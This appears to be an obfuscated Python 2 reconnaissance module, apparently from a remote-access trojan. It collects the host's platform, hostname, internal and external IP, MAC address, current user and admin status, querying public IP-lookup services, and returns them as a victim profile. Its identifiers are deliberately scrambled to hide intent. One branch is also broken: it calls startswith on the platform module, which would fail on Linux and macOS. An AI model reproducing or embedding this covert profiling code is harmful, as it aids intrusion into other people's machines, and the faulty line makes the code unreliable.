# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def riZaDmNOsluzUlWxKfMZLiUcvOhUrTuc(plat_type):
    VbIVtdAsqEDfhLzhBGeXTFuOrIDTKJTQ = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    ISvdlpvhewrgirYoFDnjblNtehwPhMMK = getpass.getuser()
    GnyXjERtDLxdxOHzQfHVwsVPMrwJGHQX    = socket.gethostname()
    oWRmzXYgWerqkSVuTLBNHgmXaYtcwZwA        = socket.getfqdn()
    DTpMzLTFMjIafnQXgFNIiDOuWjZVzlZW = socket.gethostbyname(GnyXjERtDLxdxOHzQfHVwsVPMrwJGHQX)
    XCzKfToqYYbGKorTvIgDxVrFeMjXygKx     = uuid.getnode()
    QGPfPFKoRiimlRIUXEVHnhfkVfDfVTho         = ':'.join(("%012X" % XCzKfToqYYbGKorTvIgDxVrFeMjXygKx)[tPRbiMBffyIeZvPPYViVoXWUMGNaAsOJ:tPRbiMBffyIeZvPPYViVoXWUMGNaAsOJ+2] for tPRbiMBffyIeZvPPYViVoXWUMGNaAsOJ in range(0, 12, 2))
    VocjrvTEIWoPKacANvWfHkJqecVvSYGZ = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    IyWbVMkDTXkevxbzKMbyBGuRSaNDvrjy = ''
    for cUxqDMTIZwVlTWebtlAhvJRWpxkRxQBs in VocjrvTEIWoPKacANvWfHkJqecVvSYGZ:
        try:
            IyWbVMkDTXkevxbzKMbyBGuRSaNDvrjy = urllib.urlopen('http://'+cUxqDMTIZwVlTWebtlAhvJRWpxkRxQBs).read().rstrip()
        except IOError:
            pass
        if IyWbVMkDTXkevxbzKMbyBGuRSaNDvrjy and (6 < len(IyWbVMkDTXkevxbzKMbyBGuRSaNDvrjy) < 16):
            break
    DdJfnCODkxsaqSrinvllhdHJcQrqZpdR = False
    if plat_type.startswith('win'):
        DdJfnCODkxsaqSrinvllhdHJcQrqZpdR = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        DdJfnCODkxsaqSrinvllhdHJcQrqZpdR = os.getuid() == 0
    cJHuovVxMjahBNdXgnBdZRbXZzdthnDi = 'Yes' if DdJfnCODkxsaqSrinvllhdHJcQrqZpdR else 'No'
    GAcOCEdSOvLkYQekjjusUCJuXgDnqExO = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(VbIVtdAsqEDfhLzhBGeXTFuOrIDTKJTQ, processor, architecture,
    GnyXjERtDLxdxOHzQfHVwsVPMrwJGHQX, oWRmzXYgWerqkSVuTLBNHgmXaYtcwZwA, DTpMzLTFMjIafnQXgFNIiDOuWjZVzlZW, IyWbVMkDTXkevxbzKMbyBGuRSaNDvrjy, QGPfPFKoRiimlRIUXEVHnhfkVfDfVTho, ISvdlpvhewrgirYoFDnjblNtehwPhMMK, cJHuovVxMjahBNdXgnBdZRbXZzdthnDi)
    return GAcOCEdSOvLkYQekjjusUCJuXgDnqExO
